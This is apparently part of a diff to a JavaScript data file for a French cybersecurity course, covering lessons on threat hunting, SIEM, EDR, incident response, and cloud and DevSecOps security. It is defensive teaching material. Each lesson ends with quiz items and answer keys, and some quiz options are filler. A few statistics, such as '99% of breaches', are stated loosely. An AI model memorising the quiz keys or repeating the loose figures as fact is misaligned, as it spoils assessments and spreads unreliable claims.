+glo:"<b>SPF</b> : sender policy. <b>DMARC</b> : politique. <b>Typosquatting</b> : domaine similaire.",
+pr:["Analyser header","VirusTotal URL","sandbox attachment","DMARC lookup"],
+er:"Cliquer sur le lien = risque.",
+df:"Analyser 3 mails phishing pedagogiques.",
+proj:"Analyse phishing sur GitHub.",
+q:[{q:"Phishing :",a:["Vecteur #1","Rare","Rien","Script"],c:0,e:"Principal vecteur d'infection."},{q:"DMARC :",a:["Politique mail","Antivirus","Rien","Rien"],c:0,e:"Politique d'authentification mail."}]},
+
+{id:154,t:"Threat hunting",d:50,
+intro:"La chasse aux menaces cherche activement des compromissions non detectees, sans alerte prealable.",
+analogy:"Traquer un intrus sans avoir entendu de bruit.",
+sections:[
+{titre:"Approche",contenu:"<ul><li><b>Hypothesis-driven</b> : 'Un attaquant pourrait faire X'.</li><li><b>IOC-based</b> : chercher des IOCs connus.</li><li><b>TTP-based</b> : chercher des techniques MITRE ATT&CK.</li></ul>"},
+{titre:"Sources",contenu:"<p>SIEM (Splunk, ELK, QRadar), EDR (CrowdStrike, Defender ATP), logs reseau, DNS logs.</p>"},
+{titre:"Exemple",contenu:"<p>Chercher PowerShell avec <code>-enc</code> (Base64) partout : signe classique de malware.</p>"}
+],
+why:"Detection passive laisse passer. Hunt actif trouve les compromissions cachees.",
+bank:"Hunt dans les logs bancaires = detection APT.",
+glo:"<b>TTP</b> : Tactics, Techniques, Procedures. <b>MITRE ATT&CK</b> : framework.",
+pr:["MITRE ATT&CK","Hunt PowerShell","Hunt DNS tunneling"],
+er:"Sans hypothese = recherche infinie.",
+df:"Hunt d'une technique MITRE sur logs lab.",
+proj:"Playbook threat hunting sur GitHub.",
+q:[{q:"TTP :",a:["Tactics/Techniques","Antivirus","Rien","Rien"],c:0,e:"MITRE ATT&CK."},{q:"PowerShell -enc :",a:["Suspect","Normal","Rien","Rien"],c:0,e:"Souvent malware."}]},
+
+{id:155,t:"MITRE ATT&CK",d:45,
+intro:"MITRE ATT&CK est une base des TTP utilises par les attaquants. Reference mondiale.",
+analogy:"Encyclopedie des techniques d'attaque.",
+sections:[
+{titre:"Structure",contenu:"<p>14 tactiques (Recon, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, Collection, C2, Exfiltration, Impact). Chaque tactique = techniques.</p>"},
+{titre:"Usage",contenu:"<ul><li>Mapper les detections aux TTP.</li><li>Evaluer les couvertures SIEM/EDR.</li><li>Prioriser les defenses.</li><li>Communication avec le management.</li></ul>"},
+{titre:"Exemple",contenu:"<p>T1059.001 = PowerShell. T1055 = Process Injection. T1071 = C2 web.</p>"}
+],
+why:"Framework standard pour structurer la defense.",
+bank:"Cartographier les detections bancaires contre ATT&CK.",
+glo:"<b>ATT&CK</b> : Adversarial Tactics, Techniques & Common Knowledge.",
+pr:["Explorer attack.mitre.org","Mapper 5 techniques","Evaluer couverture"],
+er:"Ne pas relier detections au TTP = defense aveugle.",
+df:"Mapper 3 detections SIEM a ATT&CK.",
+proj:"Table de mapping ATT&CK sur GitHub.",
+q:[{q:"ATT&CK :",a:["Framework TTP","Antivirus","Rien","Rien"],c:0,e:"MITRE framework."},{q:"T1059.001 :",a:["PowerShell","Ping","Rien","Rien"],c:0,e:"Execution PowerShell."}]},
+
+{id:156,t:"Reporting incident",d:40,
+intro:"Le rapport d'incident documente l'attaque, la remediation et les lecons apprises.",
+analogy:"Rapport d'enquete policiere.",
+sections:[
+{titre:"Structure",contenu:"<ol><li>Resume executif.</li><li>Chronologie.</li><li>Impact (donnees, argent, reputation).</li><li>Cause racine.</li><li>Contention/eradication/recovery.</li><li>Actions correctives.</li><li>Lecons apprises.</li></ol>"},
+{titre:"Destinataires",contenu:"<p>Management (executive summary), technique (details), legal, communication.</p>"},
+{titre:"Conformite",contenu:"<p>BCEAO impose notification sous 72h en cas de fuite (selon incidents).</p>"}
+],
+why:"Un incident non documente = pas de lecons.",
+bank:"Document obligatoire (BCEAO, RGPD, PCI).",
+glo:"<b>RCA</b> : root cause analysis. <b>Post-mortem</b> : analyse post-incident.",
+pr:["Template incident","RCA","Timeline"],
+er:"Cacher un incident = sanction x2.",
+df:"Rapport d'incident sur lab.",
+proj:"Template rapport incident sur GitHub.",
+q:[{q:"RCA :",a:["Cause racine","Rien","Rien","Rien"],c:0,e:"Root Cause Analysis."},{q:"Notification BCEAO :",a:["72h","Mois","Jamais","Rien"],c:0,e:"Selon incidents, ~72h."}]},
+
+{id:157,t:"EDR et XDR",d:40,
+intro:"Un EDR (Endpoint Detection & Response) detecte et repond aux menaces sur les endpoints. Un XDR etend a tout.",
+analogy:"Un garde du corps numerique pour chaque machine.",
+sections:[
+{titre:"Fonctions EDR",contenu:"<ul><li>Detection comportementale.</li><li>Isolation machine.</li><li>Kill process.</li><li>Investigation (arbres de processus).</li><li>Threat hunting.</li></ul>"},
+{titre:"Solutions",contenu:"<p>CrowdStrike Falcon, Microsoft Defender ATP, SentinelOne, Cortex XDR (Palo Alto), Carbon Black.</p>"},
+{titre:"XDR",contenu:"<p>EDR + reseau + email + cloud + identite = vision unifiee.</p>"}
+],
+why:"L'antivirus classique ne suffit plus. L'EDR est le standard.",
+bank:"EDR obligatoire sur les postes bancaires. Detection + containment rapide.",
+glo:"<b>EDR</b> : Endpoint Detection & Response. <b>XDR</b> : Extended DR.",
+pr:["Defender ATP","Analyser alerte","Isoler machine"],
+er:"Sans EDR = detection aveugle sur endpoint.",
+df:"Analyser une alerte EDR pedagogique.",
+proj:"Comparatif EDR sur GitHub.",
+q:[{q:"EDR :",a:["Endpoint","Reseau","Rien","Rien"],c:0,e:"Endpoint detection."},{q:"XDR :",a:["Extended","Endpoint seul","Rien","Rien"],c:0,e:"Etendu au-dela endpoint."}]},
+
+{id:158,t:"SIEM et correlation",d:50,
+intro:"Un SIEM collecte, normalise et correle les logs pour detecter des attaques.",
+analogy:"Un cerveau qui relie toutes les cameras de surveillance.",
+sections:[
+{titre:"Fonctions",contenu:"<ul><li>Collecte multi-sources.</li><li>Normalisation.</li><li>Correlation (regles).</li><li>Alerting.</li><li>Dashboards.</li><li>Retention.</li></ul>",svg:"SIEM"},
+{titre:"Solutions",contenu:"<p>Splunk, Elastic/ELK, IBM QRadar, Sentinel (Microsoft), Wazuh (libre), Graylog, LogRhythm.</p>"},
+{titre:"Regles",contenu:"<p>Ex : 5+ echecs SSH en 1min = brute-force. 4625 x 10 puis 4624 = brute-force reussi.</p>"}
+],
+why:"Sans SIEM = impossible de voir une attaque sur 1000 machines.",
+bank:"SIEM bancaire = detection continue conformite PCI.",
+glo:"<b>SIEM</b> : Security Information & Event Management. <b>Correlation</b> : regles.",
+pr:["Wazuh sur lab","Regle brute-force","Alerte","Dashboard"],
+er:"Pas de tuning = alert fatigue.",
+df:"Deployer Wazuh et creer 2 regles.",
+proj:"Regles Wazuh sur GitHub.",
+q:[{q:"SIEM :",a:["Collecte+correlation","Antivirus","Rien","Rien"],c:0,e:"Gestion evenements."},{q:"Wazuh :",a:["SIEM libre","Antivirus","Rien","Rien"],c:0,e:"SIEM open source."}]},
+
+{id:159,t:"Blue team playbooks",d:45,
+intro:"Un playbook decrit les etapes standardisees de reponse a un type d'incident.",
+analogy:"Recette de cuisine pour incident.",
+sections:[
+{titre:"Playbooks communs",contenu:"<ul><li>Phishing.</li><li>Ransomware.</li><li>Compromission compte.</li><li>Data leak.</li><li>Malware endpoint.</li><li>Brute-force SSH.</li></ul>"},
+{titre:"Structure",contenu:"<ol><li>Trigger / detection.</li><li>Tri (Triage).</li><li>Containment.</li><li>Eradication.</li><li>Recovery.</li><li>Communication.</li><li>Post-incident.</li></ol>"},
+{titre:"Automatisation",contenu:"<p>SOAR (Splunk Phantom, Cortex XSOAR) automatise les etapes repetitives.</p>"}
+],
+why:"Sans playbook = chaos pendant incident.",
+bank:"Playbook obligatoire pour incidents bancaires.",
+glo:"<b>SOAR</b> : Security Orchestration Automation & Response.",
+pr:["Playbook phishing","Playbook ransomware","Tester dry-run"],
+er:"Playbook non teste = inefficace.",
+df:"Rediger 3 playbooks (phishing, ransomware, RDP expose).",
+proj:"Playbooks sur GitHub.",
+q:[{q:"Playbook :",a:["Etapes standard","Rien","Rien","Rien"],c:0,e:"Procedures incident."},{q:"SOAR :",a:["Automatisation","Antivirus","Rien","Rien"],c:0,e:"Orchestration automatisee."}]},
+
+{id:160,t:"Projet : simulation incident",d:180,
+intro:"Simuler un incident complet : detection, containment, eradication, recovery, rapport.",
+analogy:"Exercice de pompier.",
+sections:[
+{titre:"Scenario",contenu:"<p>VM Windows infectee (ransomware pedagogique). Simuler la reponse complete.</p>"},
+{titre:"Etapes",contenu:"<ol><li>Detection (Wazuh, logs).</li><li>Isolation reseau.</li><li>Acquisition RAM (Volatility).</li><li>Acquisition disque (dcfldd).</li><li>Analyse timeline.</li><li>Eradication (reinstall).</li><li>Recovery (backup).</li><li>Rapport.</li></ol>"},
+{titre:"Livrables",contenu:"<p>Rapport + timeline + IOCs + playbook + slides.</p>"}
+],
+why:"Projet complet = preuve competence.",
+bank:"Simulation incident bancaire.",
+glo:"<b>Tabletop</b> : exercice sur table.",
+pr:["VM isolee","Simuler ransomware","Reponse complete","Rapport"],
+er:"Sans isolation = ransomware se propage.",
+df:"Rapport complet simulation.",
+proj:"Rapport simulation incident sur GitHub.",
+q:[{q:"1er :",a:["Detection","Reboot","Formater","Rien"],c:0,e:"Detection avant tout."},{q:"Rapport :",a:["Essentiel","Optionnel","Rien","Rien"],c:0,e:"Livrable final."}]},
+
+/* ---------- MODULE 9 : CLOUD & DEVSECOPS (161-180) ---------- */
+{id:161,t:"Introduction au cloud",d:35,
+intro:"Le cloud (AWS, Azure, GCP) change les modeles de securite : responsabilite partagee, IAM, API.",
+analogy:"Louer un appartement : vous etes responsable de l'interieur, le proprietaire de l'immeuble.",
+sections:[
+{titre:"Modeles",contenu:"<ul><li><b>IaaS</b> : VM (AWS EC2). Vous gerez OS+.</li><li><b>PaaS</b> : app managed. Vous gerez le code.</li><li><b>SaaS</b> : tout managed (Gmail).</li></ul>",svg:"CLOUD"},
+{titre:"Responsabilite partagee",contenu:"<p>Cloud provider = securite DU cloud. Vous = securite DANS le cloud. Les breaches viennent a 99% de mauvaises configs client.</p>"},
+{titre:"Enjeux bancaires",contenu:"<p>BCEAO, PCI-DSS imposent des controles stricts sur le cloud bancaire. Choix de region, chiffrement, audits.</p>"}
+],
+why:"Le cloud est le nouveau standard. Mal configure = fuite massive.",
+bank:"Les banques migrent vers le cloud : securite critique.",
+glo:"<b>IAM</b> : Identity Access Management. <b>VPC</b> : reseau virtuel.",
+pr:["Compte AWS free tier","Explorer IAM","VPC","S3"],
+er:"Bucket S3 public = fuite de donnees.",
+df:"Explorer un compte cloud lab (AWS free tier).",
+proj:"Schema architecture cloud securisee.",
+q:[{q:"IaaS :",a:["VM","App managed","Rien","Rien"],c:0,e:"Infrastructure as a Service."},{q:"99% breaches :",a:["Mauvaise config","Rien","Rien","Rien"],c:0,e:"Erreur client."}]},
+
+{id:162,t:"IAM cloud (AWS/Azure)",d:45,
+intro:"IAM gere les identites et permissions dans le cloud. C'est le coeur de la securite cloud.",
+analogy:"Le service RH + badges d'acces de votre cloud.",
+sections:[
+{titre:"Concepts",contenu:"<ul><li>Users, Groups, Roles.</li><li>Policies (JSON).</li><li>MFA obligatoire.</li><li>Principe du moindre privilege.</li><li>Access keys rotation.</li></ul>"},
+{titre:"Erreurs frequentes",contenu:"<ul><li>Access keys en dur dans le code.</li><li>Role * (admin partout).</li><li>MFA desactive.</li><li>Pas de rotation.</li></ul>"},
+{titre:"Outils",contenu:"<p>AWS IAM Access Analyzer, Azure AD, ScoutSuite, Prowler.</p>"}
+],
+why:"IAM mal configure = compromission cloud totale.",
+bank:"IAM bancaire cloud = compliance stricte.",
+glo:"<b>Policy</b> : regle JSON. <b>Role</b> : identite assumable.",
+pr:["AWS IAM","Creer user MFA","Politique least priv","Prowler audit"],
+er:"Cle IAM publique sur GitHub = compromission.",
+df:"Auditer un compte AWS avec Prowler.",
+proj:"Politique IAM least privilege sur GitHub.",
+q:[{q:"IAM :",a:["Identity","Rien","Rien","Rien"],c:0,e:"Identity Access Management."},{q:"Fuite cle IAM :",a:["Compromission","Rien","Rien","Rien"],c:0,e:"Acces total."}]},
+
+{id:163,t:"Securite des buckets S3/Blob",d:40,
+intro:"Les buckets mal configures exposent des donnees publiquement. Cause #1 de fuite cloud.",
+analogy:"Un coffre ouvert dans la rue.",
+sections:[
+{titre:"Risques",contenu:"<ul><li>Bucket public (donnees lisibles).</li><li>ACL trop permissive.</li><li>Pas de chiffrement au repos.</li><li>Pas de logging.</li><li>Versioning desactive.</li></ul>"},
+{titre:"Detection",contenu:"<p>Chercher des buckets publics : <code>aws s3api get-bucket-acl</code>, outils comme <b>S3Scanner</b>, <b>GrayhatWarfare</b>.</p>"},
+{titre:"Defense",contenu:"<ul><li>Block Public Access.</li><li>Chiffrement par defaut.</li><li>Logging.</li><li>Versioning.</li><li>MFA delete.</li></ul>"}
+],
+why:"Une fuite S3 = milliers de donnees exposees.",
+bank:"Buckets S3 avec donnees clients = catastrophe.",
+glo:"<b>S3</b> : stockage AWS. <b>Blob</b> : stockage Azure.",
+pr:["aws s3 ls","S3Scanner","Block Public Access","Chiffrement"],
+er:"Bucket 'public-read' sur donnees sensibles.",
+df:"Scanner un bucket S3 lab.",
+proj:"Checklist bucket sur GitHub.",
+q:[{q:"Bucket public :",a:["Fuite","Normal","Rien","Rien"],c:0,e:"Cause #1 fuite."},{q:"Defense :",a:["Block public","Rien","Rien","Rien"],c:0,e:"Block Public Access."}]},
+
+{id:164,t:"VPC et reseau cloud",d:45,
+intro:"Un VPC (Virtual Private Cloud) isole votre reseau cloud. Security groups et NACLs controlent le trafic.",
+analogy:"Un immeuble avec portes et vigiles.",
+sections:[
+{titre:"Composants",contenu:"<ul><li><b>VPC</b> : reseau isole.</li><li><b>Subnets</b> : publics/prives.</li><li><b>Security Groups</b> : pare-feu instance (stateful).</li><li><b>NACL</b> : pare-feu subnet (stateless).</li><li><b>Internet Gateway</b>, <b>NAT</b>.</li></ul>"},
+{titre:"Erreurs",contenu:"<ul><li>Base de donnees dans subnet public.</li><li>SG en 0.0.0.0/0 sur SSH/RDP.</li><li>Pas de flow logs.</li></ul>"},
+{titre:"Defense",contenu:"<p>Subnets prives par defaut, bastion host, VPC flow logs, security groups restrictifs.</p>"}
+],
+why:"Architecture reseau cloud = fondation securite.",
+bank:"VPC bancaire = isolation stricte des zones.",
+glo:"<b>VPC</b> : reseau virtuel. <b>SG</b> : security group.",
+pr:["AWS VPC","Subnet prive","SG restrictif","Flow logs"],
+er:"0.0.0.0/0 sur SSH = brute-force public.",
+df:"Schema VPC securise sur GitHub.",
+proj:"Architecture VPC bancaire documentee.",
+q:[{q:"SG :",a:["Stateful","Stateless","Rien","Rien"],c:0,e:"Security Group = stateful."},{q:"0.0.0.0/0 SSH :",a:["Dangereux","Normal","Rien","Rien"],c:0,e:"Expose au monde."}]},
+
+{id:165,t:"Conteneurs et Docker",d:45,
+intro:"Docker revolutionne le deploiement. Mal securise, il est une porte d'entree (container escape).",
+analogy:"Des boites standardisees pour applications.",
+sections:[
+{titre:"Risques",contenu:"<ul><li>Image non patchee.</li><li>Container run en root.</li><li>Docker socket expose.</li><li>Secrets en dur.</li><li>Pas de scan image.</li></ul>"},
+{titre:"Defense",contenu:"<ul><li>Images distroless, non-root.</li><li>Scan (Trivy, Grype).</li><li>Read-only FS.</li><li>Pas de --privileged.</li><li>Secrets manager.</li></ul>"},
+{titre:"Container escape",contenu:"<p>Si un conteneur est compromis et mal configure, on peut parfois atteindre l'hote (capabilities, mount).</p>"}
+],
+why:"Containers = cible moderne. Une image compromise = toute l'app.",
+bank:"Docker bancaire = audit obligatoire des images.",
+glo:"<b>Image</b> : snapshot. <b>Container escape</b> : sortir du conteneur.",
+pr:["Docker run alpine","Trivy scan","Non-root user","Read-only FS"],
+er:"--privileged = quasi root sur hote.",
+df:"Scanner une image Docker avec Trivy.",
+proj:"Dockerfile securise sur GitHub.",
+q:[{q:"Scan image :",a:["Trivy","Docker","Rien","Rien"],c:0,e:"Trivy, Grype."},{q:"--privileged :",a:["Dangereux","Sur","Rien","Rien"],c:0,e:"Risque escape."}]},
+
+{id:166,t:"Kubernetes securite",d:55,
+intro:"Kubernetes orchestre les conteneurs. Sa complexite cree de nouvelles surfaces d'attaque.",
+analogy:"Un orchestrateur d'orchestres.",
+sections:[
+{titre:"Risques",contenu:"<ul><li>API server expose.</li><li>RBAC trop permissif.</li><li>Pods privileged.</li><li>Secrets en ConfigMap.</li><li>Pas de network policies.</li></ul>"},
+{titre:"Defense",contenu:"<ul><li>RBAC least privilege.</li><li>Network policies.</li><li>Pod Security Standards.</li><li>Secrets chiffres (Sealed Secrets, Vault).</li><li>Audit logs.</li></ul>"},
+{titre:"Outils",contenu:"<p>kube-bench, kube-hunter, Trivy, Falco (runtime), Polaris.</p>"}
+],
+why:"K8s = standard cloud. Une mauvaise config = compromission cluster.",
+bank:"K8s bancaire = conformite critique.",
+glo:"<b>RBAC</b> : role-based. <b>Pod</b> : conteneur K8s.",
+pr:["kube-bench","RBAC restrictif","Network policies","Falco"],
+er:"Service account default = souvent trop permissif.",
+df:"Auditer un cluster K8s lab avec kube-bench.",
+proj:"Checklist K8s sur GitHub.",
+q:[{q:"RBAC :",a:["Roles","Pods","Rien","Rien"],c:0,e:"Role-based access."},{q:"Falco :",a:["Runtime","Build","Rien","Rien"],c:0,e:"Detection runtime."}]},
+
+{id:167,t:"CI/CD securise (DevSecOps)",d:50,
+intro:"Le DevSecOps integre la securite dans le pipeline CI/CD des le debut.",
+analogy:"Securite a chaque etape, pas seulement a la fin.",
+sections:[
+{titre:"Etapes securisees",contenu:"<ol><li>Pre-commit : secrets scan.</li><li>Build : SAST.</li><li>Deps : SCA (dependances).</li><li>Image : scan conteneur.</li><li>Deploy : IaC scan.</li><li>Runtime : DAST + monitoring.</li></ol>"},
+{titre:"Outils",contenu:"<p>SAST : Semgrep, SonarQube. SCA : Dependabot, Snyk. Secret scan : gitleaks, trufflehog. IaC : Checkov, tfsec. DAST : OWASP ZAP.</p>"},
+{titre:"Shift left",contenu:"<p>Corriger une faille en dev coute 100x moins cher qu'en prod.</p>"}
+],
+why:"Un code non audite en prod = risque. Le pipeline est le bon endroit.",
+bank:"Pipeline bancaire = controles securite obligatoires.",
+glo:"<b>SAST</b> : analyse statique. <b>DAST</b> : dynamique. <b>SCA</b> : dependances.",
+pr:["Semgrep sur repo","Gitleaks","Checkov","ZAP sur app"],
+er:"Securite uniquement en fin de pipeline = inefficace.",
+df:"Pipeline GitHub Actions avec SAST+SCA+secrets.",
+proj:"Pipeline DevSecOps sur GitHub.",
+q:[{q:"SAST :",a:["Statique","Dynamique","Rien","Rien"],c:0,e:"Analyse code."},{q:"Shift left :",a:["Tot","Tard","Rien","Rien"],c:0,e:"Securite des le debut."}]},
+
+{id:168,t:"IaC securise (Terraform)",d:45,
+intro:"L'Infrastructure as Code (Terraform, CloudFormation) doit etre auditee comme du code.",
+analogy:"Un plan d'architecte : une erreur = batiment entier.",
+sections:[
+{titre:"Risques",contenu:"<ul><li>Secrets en clair.</li><li>Buckets publics.</li><li>SG 0.0.0.0/0.</li><li>Pas de chiffrement.</li><li>IAM trop permissif.</li></ul>"},
+{titre:"Outils",contenu:"<p>Checkov, tfsec, terrascan, KICS. Policies custom.</p>"},
+{titre:"Bonnes pratiques",contenu:"<ul><li>State distant chiffre.</li><li>Secrets via variables.</li><li>Scan en CI.</li><li>Revue par pairs.</li></ul>"}
+],
+why:"Une erreur IaC se deploie partout.",
+bank:"IaC bancaire = conformite automatisee.",
+glo:"<b>IaC</b> : Infrastructure as Code. <b>State</b> : etat Terraform.",
+pr:["Checkov sur projet","Tfsec","State distant","CI scan"],
+er:"State local non chiffre = fuite credentials.",
+df:"Auditer un projet Terraform avec Checkov.",
+proj:"Module Terraform securise sur GitHub.",
+q:[{q:"IaC :",a:["Infra as Code","Rien","Rien","Rien"],c:0,e:"Terraform, CloudFormation."},{q:"Checkov :",a:["Scan IaC","Rien","Rien","Rien"],c:0,e:"Audit IaC."}]},
+
+{id:169,t:"Secrets management",d:40,
+intro:"Ne jamais mettre de secrets (cles, MDP, tokens) en clair dans le code ou les configs.",
+analogy:"Ne jamais ecrire son code de carte sur la carte.",
+sections:[
+{titre:"Solutions",contenu:"<ul><li><b>Vault</b> (HashiCorp) : gestion centrale.</li><li><b>AWS Secrets Manager</b>, <b>Azure Key Vault</b>.</li><li><b>Sealed Secrets</b> (K8s).</li><li><b>SOPS</b> : chiffrement fichier.</li></ul>"},
+{titre:"Detection",contenu:"<p>gitleaks, trufflehog, GitHub secret scanning. Scan pre-commit.</p>"},
+{titre:"Bonnes pratiques",contenu:"<ul><li>Rotation reguliere.</li><li>Audit d'acces.</li><li>Pas de secret dans Git.</li><li>Variables d'environnement (mais pas parfaites).</li></ul>"}
+],
+why:"Un secret expose = compromission.",
+bank:"Secrets bancaires = criticite maximale.",
+glo:"<b>Vault</b> : gestion secrets. <b>Rotation</b> : changement periodique.",
+pr:["Gitleaks sur repo","Vault dev","Rotation secrets","Trufflehog"],
+er:"Secrets dans Git = difficiles a effacer.",
+df:"Scanner 3 repos avec Gitleaks.",
+proj:"Setup Vault sur GitHub.",
+q:[{q:"Secrets :",a:["Jamais en clair","OK","Rien","Rien"],c:0,e:"Jamais dans le code."},{q:"Gitleaks :",a:["Detection","Chiffrement","Rien","Rien"],c:0,e:"Detecte secrets Git."}]},
+
+{id:170,t:"Zero Trust architecture",d:50,
+intro:"Le modele Zero Trust ne fait confiance a rien par defaut : chaque acces doit etre verifie.",
+analogy:"Verifier chaque personne a chaque porte, meme dans le batiment.",
+sections:[
+{titre:"Principes",contenu:"<ul><li>Never trust, always verify.</li><li>Least privilege.</li><li>Microsegmentation.</li><li>Verification continue.</li><li>Assume breach.</li></ul>"},
+{titre:"Composants",contenu:"<ul><li>Identite forte (MFA, FIDO2).</li><li>Device posture.</li><li>Micro-segmentation.</li><li>Monitoring continu.</li></ul>"},
+{titre:"Applications bancaires",contenu:"<p>Zero Trust est le standard actuel. VPN remplaces par ZTNA.</p>"}
+],
+why:"Le perimetre n'existe plus (cloud, mobile, remote).",
+bank:"Zero Trust obligatoire pour les banques modernes.",
+glo:"<b>ZTNA</b> : Zero Trust Network Access. <b>MFA</b> : facteur multiple.",
+pr:["MFA partout","Device posture","Microsegmentation","ZTNA"],
+er:"VPN seul = pas Zero Trust.",
+df:"Plan Zero Trust pour une PME.",
+proj:"Zero Trust roadmap sur GitHub.",
+q:[{q:"Zero Trust :",a:["Verifier tout","Tout confiance","Rien","Rien"],c:0,e:"Never trust, always verify."},{q:"MFA :",a:["Obligatoire","Optionnel","Rien","Rien"],c:0,e:"Zero Trust = MFA partout."}]},
+
+{id:171,t:"Audit cloud (ScoutSuite)",d:45,
+intro:"ScoutSuite, Prowler, CloudSploit auditer la configuration cloud contre les benchmarks.",
+analogy:"Un inspecteur des batiments cloud.",
+sections:[
+{titre:"ScoutSuite",contenu:"<p>Multi-cloud (AWS, Azure, GCP). Rapport HTML. Detecte IAM faibles, buckets publics, chiffrement absent.</p>"},
+{titre:"Prowler",contenu:"<p>Specifique AWS, 400+ checks. CIS, PCI-DSS, HIPAA. Peut s'executer en CI.</p>"},
+{titre:"Workflow",contenu:"<ol><li>Credentials read-only.</li><li>Run scan.</li><li>Analyser rapport.</li><li>Prioriser fixes.</li><li>Re-scanner.</li></ol>"}
+],
+why:"Audit cloud regulier = conformite + securite.",
+bank:"Audit cloud bancaire = obligatoire (BCEAO, PCI).",
+glo:"<b>CIS</b> : benchmark. <b>Read-only</b> : lecture seule.",
+pr:["ScoutSuite AWS","Prowler","Analyser rapport","Fix puis re-scan"],
+er:"Scanner en prod sans read-only = risque.",
+df:"Auditer AWS avec Prowler (lab).",
+proj:"Rapport audit cloud sur GitHub.",
+q:[{q:"ScoutSuite :",a:["Multi-cloud","AWS seul","Rien","Rien"],c:0,e:"Multi-cloud."},{q:"Prowler :",a:["AWS","Rien","Rien","Rien"],c:0,e:"Specialise AWS."}]},
+
+{id:172,t:"Chiffrement cloud",d:40,
+intro:"Cloud : chiffrement au repos (KMS, SSE) et en transit (TLS).",
+analogy:"Un coffre chez le cloud.",
+sections:[
+{titre:"Options",contenu:"<ul><li><b>SSE-S3</b> : cle geree par AWS.</li><li><b>SSE-KMS</b> : cle geree par KMS.</li><li><b>SSE-C</b> : cle client.</li><li><b>Client-side</b> : chiffre avant upload.</li></ul>"},
+{titre:"KMS",contenu:"<p>Key Management Service : stocke et gere les cles. Rotation auto. Audit via CloudTrail.</p>"},
+{titre:"Confidential computing",contenu:"<p>SGX, Nitro Enclaves : chiffrement pendant le traitement.</p>"}
+],
+why:"Conformite impose chiffrement cloud.",
+bank:"Donnees bancaires cloud = chiffrement obligatoire.",
+glo:"<b>KMS</b> : Key Management Service. <b>SSE</b> : server-side encryption.",
+pr:["S3 SSE-KMS","KMS keys","Rotation","CloudTrail"],
+er:"Cle KMS sans rotation = risque.",
+df:"Chiffrer bucket S3 avec KMS.",
+proj:"Politique chiffrement cloud sur GitHub.",
+q:[{q:"KMS :",a:["Keys","Rien","Rien","Rien"],c:0,e:"Key Management Service."},{q:"SSE :",a:["Server-Side Encryption","Rien","Rien","Rien"],c:0,e:"Chiffrement serveur."}]},
+
+{id:173,t:"Logging cloud (CloudTrail)",d:40,
+intro:"CloudTrail (AWS), Activity Log (Azure), Audit Logs (GCP) enregistrent toutes les actions API.",
+analogy:"Une camera de surveillance sur chaque action.",
+sections:[
+{titre:"CloudTrail",contenu:"<p>Logs API AWS (creation user, changement policy, suppression bucket...). Retention illimitee possible. Integration SIEM.</p>"},
+{titre:"Detection",contenu:"<ul><li>Console login sans MFA.</li><li>Creation access key.</li><li>Modification policy.</li><li>Suppression log (attaque).</li></ul>"},
+{titre:"Defense",contenu:"<p>Activer CloudTrail toutes les regions. Envoyer vers S3 chiffre + retention. Detecter les suppressions.</p>"}
+],
+why:"Sans logs = pas d'analyse d'incident cloud.",
+bank:"Logs cloud = conformite PCI.",
+glo:"<b>CloudTrail</b> : logs AWS API.",
+pr:["CloudTrail actif","Analyse evenements","Alertes","Integration SIEM"],
+er:"Pas de CloudTrail = incident cloud invisible.",
+df:"Analyser 100 evenements CloudTrail.",
+proj:"Requetes CloudTrail sur GitHub.",
+q:[{q:"CloudTrail :",a:["Logs API","Rien","Rien","Rien"],c:0,e:"Logs AWS API."},{q:"Suppression log :",a:["Attaque","Normal","Rien","Rien"],c:0,e:"Signe compromission."}]},
+
+{id:174,t:"Securite SaaS",d:40,
+intro:"Les SaaS (Office 365, Google Workspace, Salesforce) demandent des controles specifiques.",
+analogy:"Louer un appartement meuble : vous gerez l'interieur.",
+sections:[
+{titre:"Risques",contenu:"<ul><li>MFA absent.</li><li>Partages publics.</li><li>OAuth apps malveillantes.</li><li>Pas de DLP.</li><li>Comptes inactifs.</li></ul>"},
+{titre:"Defense",contenu:"<ul><li>MFA obligatoire.</li><li>Conditional Access.</li><li>DLP.</li><li>Audit OAuth apps.</li><li>Monitoring.</li></ul>"},
+{titre:"Outils",contenu:"<p>Microsoft Defender for Cloud Apps, Google Workspace security.</p>"}
+],
+why:"SaaS = 80% des emails et docs d'entreprise.",
+bank:"Office 365 bancaire = cible phishing.",
+glo:"<b>DLP</b> : Data Loss Prevention. <b>Conditional Access</b> : politiques d'acces.",
+pr:["MFA Microsoft 365","Conditional Access","Audit OAuth","DLP"],
+er:"OAuth app malveillante = acces total mailbox.",
+df:"Auditer un tenant Microsoft 365 lab.",
+proj:"Checklist SaaS sur GitHub.",
+q:[{q:"DLP :",a:["Data Loss Prevention","Rien","Rien","Rien"],c:0,e:"Contre fuites."},{q:"OAuth malveillant :",a:["Acces total","Rien","Rien","Rien"],c:0,e:"Peut lire mailbox."}]},
+
+{id:175,t:"Securite des APIs cloud",d:45,
+intro:"Les APIs cloud (AWS, Azure) doivent etre securisees : auth, rate limit, monitoring.",
+analogy:"Chaque porte API doit etre verifiee.",
+sections:[
+{titre:"Bonnes pratiques",contenu:"<ul><li>Auth forte (MFA, OAuth).</li><li>Rate limiting.</li><li>Monitoring (WAF, API Gateway).</li><li>Pas de cle en URL.</li><li>Input validation.</li></ul>"},
+{titre:"API Gateway",contenu:"<p>Point central pour auth, rate limit, logs, WAF integration.</p>"},
+{titre:"OWASP API Top 10",contenu:"<p>BOLA, BFLA, Broken Auth, Mass Assignment, SSRF, etc.</p>"}
+],
+why:"APIs = porte d'entree principale des apps modernes.",
+bank:"APIs bancaires = cible #1 des attaques.",
+glo:"<b>BOLA</b> : Broken Object Level Auth. <b>Rate limit</b> : limitation debit.",
+pr:["API Gateway","Rate limit","Auth","WAF"],
+er:"API sans rate limit = brute-force facile.",
+df:"Securiser une API lab.",
+proj:"Checklist API security sur GitHub.",
+q:[{q:"BOLA :",a:["IDOR API","Rien","Rien","Rien"],c:0,e:"Broken Object Level."},{q:"Rate limit :",a:["Essentiel","Optionnel","Rien","Rien"],c:0,e:"Anti brute-force."}]},
+
+{id:176,t:"Modeles de menace (STRIDE)",d:45,
+intro:"STRIDE identifie 6 categories de menaces : Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation of privilege.",
+analogy:"Une grille d'analyse pour ne rien oublier.",
+sections:[
